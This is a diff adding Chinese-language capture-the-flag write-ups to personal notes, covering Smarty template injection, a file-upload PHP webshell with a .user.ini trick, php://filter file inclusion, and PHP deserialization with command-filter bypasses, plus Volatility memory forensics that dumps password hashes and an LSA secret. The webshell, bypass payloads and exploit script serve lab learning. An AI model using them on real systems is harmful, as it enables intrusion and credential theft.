@@ -992,7 +992,7 @@ highlight_file(__FILE__);
 
 class FileHandler {
 
-    `protected` $op;
+    protected` $op;
     protected $filename;
     protected $content;
 
@@ -2067,6 +2067,346 @@ GIF89a
 
 <img src="CTF.assets/image-20230709230830785.png" alt="image-20230709230830785" style="zoom:50%;" />
 
+## [BJDCTF2020]The mystery of ip
+
+这题考察的是PHP的Smart模板注入
+
+进去首先先查看提示：Hint.php
+
+![image-20230831212107084](CTF.assets/image-20230831212107084.png)
+
+这里可以看到提示我们可以使用HTTP字段：`X-Forwarded-For`，使用Hack bar修改头部
+
+<img src="CTF.assets/image-20230831212254355.png" alt="image-20230831212254355" style="zoom:50%;" />
+
+这里可以怀疑后台对于：`X-Forwarded-For`传入的值没有任何的安全过滤，那么可以尝试一些payload来触发漏洞
+
+<img src="CTF.assets/image-20230831212502591.png" alt="image-20230831212502591" style="zoom:67%;" />
+
+`{{7*7}}`被成功计算，发现这里存在SSTI漏洞
+
+<img src="CTF.assets/image-20230831212556260.png" alt="image-20230831212556260" style="zoom:67%;" />
+
+根据报错提示，可以确定这里使用的是Smarty模板
+
+<img src="CTF.assets/image-20230831212635498.png" alt="image-20230831212635498" style="zoom:50%;" />
+
+成功得到Flag
+
+## [SUCTF 2019]CheckIn
+
+进入网站，一个文件上传口
+
+![image-20230901143252820](CTF.assets/image-20230901143252820.png)
+
+使用插件查看，发现用的是Nginx服务器，那么或许可以上传`.user.ini`配置文件
+
+<img src="CTF.assets/image-20230901143344819.png" alt="image-20230901143344819" style="zoom:67%;" />
+
+尝试上传最普通的一句话木马
+
+![image-20230901144628731](CTF.assets/image-20230901144628731.png)
+
+发现对`<?`进行了严格过滤，所以这里只能用`script`标签的一句话木马：`<script language="php">eval($_POST['cmd']);</script>`
+
+这里显示，要求上传一张图片，使用BP来修改文件类型绕过，并添加GIF89a文件头
+
+![image-20230901144740530](CTF.assets/image-20230901144740530.png)
+
+上传成功：
+
+```
+GIF89a
+<script language="php">eval($_POST['cmd']);</script>
+```
+
+![image-20230901144954034](CTF.assets/image-20230901144954034.png)
+
+到这一步，虽然已经成功上传了木马上去，但是由于后缀不是PHP文件，所以无法执行。那么这里还需要上传一个`.user.ini`文件上去（依旧注意要修改文件类型和添加GIF89a头）
+
+![image-20230901145414887](CTF.assets/image-20230901145414887.png)
+
+最后使用蚁剑连接即可
+
+**顺序应该是：先上传`.user.ini`再上传木马文件**
+
+## [BSidesCF 2020]Had a bad day
+
+进来读源码，发现使用Form表单的GET提交参数，来确定前端要返回的图片
+
+<img src="CTF.assets/image-20230901172246997.png" alt="image-20230901172246997" style="zoom:50%;" />
+
+加一个单引号试一下，可以看到`include`函数报错，那么就可以确定是文件包含了
+
+<img src="CTF.assets/image-20230901172330677.png" alt="image-20230901172330677" style="zoom:50%;" />
+
+尝试使用`php://filter`包含`index.php`，这里注意报错，**后台会在上传的字符串中自动追加PHP，所以直接传入index即可**
+
+```
+php://filter/read=convert.base64-encode/resource=index
+```
+
+<img src="CTF.assets/image-20230901172815113.png" alt="image-20230901172815113" style="zoom:67%;" />
+
+得到源码如下：
+
+```php
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Images that spark joy">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <title>Had a bad day?</title>
+    <link rel="stylesheet" href="css/material.min.css">
+    <link rel="stylesheet" href="css/style.css">
+  </head>
+  <body>
+    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
+      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
+        <div class="mdl-layout__header-row">
+          <span class="mdl-layout-title">Had a bad day?</span>
+          <div class="mdl-layout-spacer"></div>
+        <div>
+      </header>
+      <div class="page-ribbon"></div>
+      <main class="page-main mdl-layout__content">
+        <div class="page-container mdl-grid">
+          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
+          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
+            <div class="page-crumbs mdl-color-text--grey-500">
+            </div>
+            <h3>Cheer up!</h3>
+              <p>
+                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
+              </p>
+              <div class="page-include">
+              <?php
+				$file = $_GET['category'];
+				# 这里要求传入的字符串中必须带有：woofers、meowers且index不能位于首位
+				if(isset($file))
+				{
+					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
+						include ($file . '.php');
+					}
+					else{
+						echo "Sorry, we currently only support woofers and meowers.";
+					}
+				}
+				?>
+			</div>
+          <form action="index.php" method="get" id="choice">
+              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
+              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
+          </form>
+
+          </div>
+        </div>
+      </main>
+    </div>
+    <script src="js/material.min.js"></script>
+  </body>
+</html>
+```
+
+最后payload
+
+```
+php://filter/read=convert.base64-encode/resource=woofers/../flag
+```
+
+这里解释一下`woofers/../flag`，将`woofers`当作一个文件夹，然后进去再退出来找`flag.php` == 找当前文件夹下的flag.php
+
+## 攻防世界 unseping
+
+考点：PHP反序列化
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class ease{
+    
+    private $method;
+    # 要执行的系统命令
+    private $args;
+    function __construct($method, $args) {
+        $this->method = $method;
+        $this->args = $args;
+    }
+ 
+    function __destruct(){
+        # 要求 method="ping"
+        if (in_array($this->method, array("ping"))) {
+            # 两个参数都必须为数组
+            call_user_func_array(array($this, $this->method), $this->args);
+        }
+    } 
+ 
+    function ping($ip){
+        exec($ip, $result);
+        var_dump($result);
+    }
+
+    function waf($str){
+        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
+            return $str;
+        } else {
+            echo "don't hack";
+        }
+    }
+ 
+    function __wakeup(){
+        foreach($this->args as $k => $v) {
+            $this->args[$k] = $this->waf($v);
+        }
+    }   
+}
+
+$ctf=@$_POST['ctf'];
+@unserialize(base64_decode($ctf));
+?>
+```
+
+### 前置知识
+
+#### `in_array`
+
+in_array — 检查数组中是否存在某个值 **严格匹配**
+
+##### 说明
+
+```
+in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool
+```
+
+大海捞针，在大海（`haystack`）中搜索针（ `needle`），如果没有设置 `strict` 则使用宽松的比较。
+
+##### 参数
+
+
+
+- `needle`
+
+  待搜索的值。**Note**:如果 `needle` 是字符串，则比较是区分大小写的。
+
+- `haystack`
+
+  待搜索的数组。
+
+- `strict`
+
+  如果第三个参数 `strict` 的值为 **`TRUE`** 则 **in_array()** 函数还会检查 `needle` 的[类型](language.types.html)是否和 `haystack` 中的相同。
+
+##### 返回值
+
+如果找到 `needle` 则返回 **`TRUE`**，否则返回 **`FALSE`**。
+
+##### 示例
+
+```php
+<?php
+var_dump(in_array("ping", array("ping")));
+# 输出：TRUE
+
+<?php
+var_dump(in_array("ping1", array("ping")));
+# 输出：FALSE
+```
+
+#### `call_user_func_array`
+
+call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数
+
+##### 说明
+
+```
+call_user_func_array ( [callable](language.types.callable.html) `$callback` , array `$param_arr` )
+```
+
+把第一个参数作为回调函数（`callback`）调用，把参数数组作（`param_arr`）为回调函数的的参数传入。
+
+##### 参数
+
+- `callback`
+
+  被调用的回调函数。
+
+- `param_arr`
+
+  要被传入回调函数的数组，这个数组得是索引数组。
+
+###### 返回值
+
+返回回调函数的结果。如果出错的话就返回**`FALSE`**
+
+### Linux部分
+
+Linux 命令中插入引号依然可以继续执行想要执行的命令
+
+```
+┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
+└─# c''at f''lag.txt
+flag is this
+                                                                                                                                                    
+┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
+└─# c""at f""lag.txt
+flag is this
+```
+
+Linux 中可以使用`printf`配合编码打印出想要打印的字符串
+
+```
+\NNN 八进制数 NNN 所代表的 ASCII 码字符。
+\xHH 十六进制 HH 对应的8位字符。HH 可以是一到两位。
+\uHHHH 十六进制 HHHH 对应的 Unicode 字符。HHHH 一到四位。
+\UHHHHHHHH十六进制 HHHHHHHH 对应的 Unicode 字符。HHHHHHHH 一到八位
+```
+
+```
+┌──(root㉿pinginglab)-[/home/pinginglab/php-exec]
+└─# printf "\57"
+/ 
+```
+
+### 解题流程
+
+使用双引号绕过WAF，`$(printf${IFS}"\57") = /`
+
+**最后脚本**
+
+```php
+<?php
+
+class ease
+{
+
+    public $method = "ping";
+    public $args = array('c""at${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp');
+
+    function __destruct()
+    {
+        # $method 必须是字符串 ping
+        if (in_array($this->method, array("ping"))) {
+            call_user_func_array(array($this, $this->method), $this->args);
+        }
+    }
+
+    function ping($ip)
+    {
+        exec($ip, $result);
+        var_dump($result);
+    }
+
+
+}
+$e = new ease();
+$e = serialize($e);
+echo base64_encode($e);
+```
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
@@ -2128,11 +2468,9 @@ Archive:  00000000.zip
 flag{ev3n::y0u::bru7us?!} 
 ```
 
+# 数字取证
 
-
-## 数字取证
-
-### 1. 不知道哪里的题目
+## 1. 不知道哪里的题目
 
 > 内存文件下载连接：链接：https://pan.baidu.com/s/1xEV5bnB12C_qYp3fTb98Lg?pwd=q8rr 提取码：q8rr
 >
@@ -2248,3 +2586,235 @@ DataSectionObject 0x3e435890   None   \Device\HarddiskVolume2\Users\Administrato
 **1.9 获取flag**
 
 <img src="CTF.assets/image-20230618180040413.png" alt="image-20230618180040413" style="zoom:50%;" />
+
+## [otterctf] What the password-查找用户密码
+
+**1. 使用hashdump查看用户哈希**
+
+尝试放在其他在线解密网站，但是无法成功解密
+
+```
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 hashdump                                            
+Volatility Foundation Volatility Framework 2.6.1
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940:::
+```
+
+**2. 使用lasdump解密哈希**
+
+lsadump：从注册表中提取LSA密钥信息,显示加密以后的数据用户密码
+
+```
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 lsadump 
+Volatility Foundation Volatility Framework 2.6.1
+DefaultPassword
+0x00000000  28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   (...............
+0x00000010  4d 00 6f 00 72 00 74 00 79 00 49 00 73 00 52 00   M.o.r.t.y.I.s.R.
+0x00000020  65 00 61 00 6c 00 6c 00 79 00 41 00 6e 00 4f 00   e.a.l.l.y.A.n.O.
+0x00000030  74 00 74 00 65 00 72 00 00 00 00 00 00 00 00 00   t.t.e.r.........
+```
+
+```
+ flag:CTF{MortyIsReallyAnOtter}
+```
+
+## [otterctf] General Info-查找IP地址和主机名
+
+**netscan 查看IP地址**
+
+==netscan=netstat==
+
+```
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 netscan
+Volatility Foundation Volatility Framework 2.6.1
+Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
+0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000
+0x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+0000
+0x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04
+```
+
+```
+ flag:CTF{192.168.202.131}
+```
+
+**查看主机名**
+
+主机名等计算机相关信息都会保存在注册表中
+
+```bash
+# 查看注册表
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  hivelist
+Volatility Foundation Volatility Framework 2.6.1
+Virtual            Physical           Name
+------------------ ------------------ ----
+0xfffff8a00377d2d0 0x00000000624162d0 \??\C:\System Volume Information\Syscache.hve
+0xfffff8a00000f010 0x000000002d4c1010 [no name]
+0xfffff8a000024010 0x000000002d50c010 \REGISTRY\MACHINE\SYSTEM
+0xfffff8a000053320 0x000000002d5bb320 \REGISTRY\MACHINE\HARDWARE
+0xfffff8a000109410 0x0000000029cb4410 \SystemRoot\System32\Config\SECURITY
+0xfffff8a00033d410 0x000000002a958410 \Device\HarddiskVolume1\Boot\BCD
+0xfffff8a0005d5010 0x000000002a983010 \SystemRoot\System32\Config\SOFTWARE
+0xfffff8a001495010 0x0000000024912010 \SystemRoot\System32\Config\DEFAULT
+0xfffff8a0016d4010 0x00000000214e1010 \SystemRoot\System32\Config\SAM
+0xfffff8a00175b010 0x00000000211eb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
+0xfffff8a00176e410 0x00000000206db410 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
+0xfffff8a002090010 0x000000000b92b010 \??\C:\Users\Rick\ntuser.dat
+0xfffff8a0020ad410 0x000000000db41410 \??\C:\Users\Rick\AppData\Local\Microsoft\Windows\UsrClass.dat
+
+# 主机名一般保存在SYSTEM中
+# 这里显示的是SYSTEM下的子键，继续向下找
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 printkey
+Volatility Foundation Volatility Framework 2.6.1
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5} (S)
+Last updated: 2018-08-04 19:25:54 UTC+0000
+
+Subkeys:
+  (S) ControlSet001
+  (S) ControlSet002
+  (S) MountedDevices
+  (S) RNG
+  (S) Select
+  (S) Setup
+  (S) Software
+  (S) WPA
+  (V) CurrentControlSet
+
+Values:
+
+# 继续向下找
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001" printkey
+Volatility Foundation Volatility Framework 2.6.1
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ControlSet001 (S)
+Last updated: 2018-06-02 19:23:00 UTC+0000
+
+Subkeys:
+  (S) Control
+  (S) Enum
+  (S) Hardware Profiles
+  (S) Policies
+  (S) services
+
+Values:
+
+
+# 继续向下找
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control" printkey
+Volatility Foundation Volatility Framework 2.6.1
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: Control (S)
+Last updated: 2018-08-04 19:26:03 UTC+0000
+
+Subkeys:
+  (S) ACPI
+  (S) AGP
+  (S) AppID
+  (S) Arbiters
+  (S) BackupRestore
+  (S) Class
+  (S) CMF
+  (S) CoDeviceInstallers
+  (S) COM Name Arbiter
+  (S) ComputerName
+  
+ # 继续向下找
+ ┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control\\ComputerName" printkey
+Volatility Foundation Volatility Framework 2.6.1
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ComputerName (S)
+Last updated: 2018-08-04 19:26:11 UTC+0000
+
+Subkeys:
+  (S) ComputerName
+  (V) ActiveComputerName
+
+Values:
+
+# 发现主机名：WIN-LO6FAF3DTFE
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64  -o 0xfffff8a000024010 -K "ControlSet001\\Control\\ComputerName\\ComputerName" printkey
+Volatility Foundation Volatility Framework 2.6.1
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ComputerName (S)
+Last updated: 2018-06-02 19:23:00 UTC+0000
+
+Subkeys:
+
+Values:
+REG_SZ                        : (S) mnmsrvc
+REG_SZ        ComputerName    : (S) WIN-LO6FAF3DTFE
+
+```
+
+```
+flag:CTF{WIN-LO6FAF3DTFE}
+```
+
+## [otterctf] Silly Rick-查看剪贴板内容
+
+**查看粘贴板**
+
+```
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 clipboard
+Volatility Foundation Volatility Framework 2.6.1
+Session    WindowStation Format                         Handle Object             Data                                              
+---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
+         1 WinSta0       CF_UNICODETEXT                0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs                                    
+         1 WinSta0       CF_TEXT                          0x10 ------------------                                                   
+         1 WinSta0       0x150133L              0x200000000000 ------------------                                                   
+         1 WinSta0       CF_TEXT                           0x1 ------------------                                                   
+         1 ------------- ------------------           0x150133 0xfffff900c1c1adc0 
+```
+
+## [otterctf] Hide And Seek-查找病毒
+
+这里发现一个可疑程：`mware-tray.ex`，父进程是：`Rick And Morty`
+
+```bash
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist         
+Volatility Foundation Volatility Framework 2.6.1
+Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
+------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ -----------------
+0xfffffa801b486b30 Rick And Morty         3820   2728      4      185      1      1 2018-08-04 19:32:55 UTC+0000                                 
+0xfffffa801a4c5b30 vmware-tray.ex         3720   3820      8      147      1      1 2018-08-04 19:33:02 UTC+0000   
+```
+
+使用`dlllist`查看程序的动态链接库，可发现是在TEMP路径下执行的
+
+```
+┌──(pinginglab㉿pinginglab)-[~/桌面]
+└─$ vol.py -f OtterCTF.vmem --profile=Win7SP1x64 dlllist -p 3720
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+vmware-tray.ex pid:   3720
+Command line : "C:\Users\Rick\AppData\Local\Temp\RarSFX0\vmware-tray.exe" 
+
+```
+
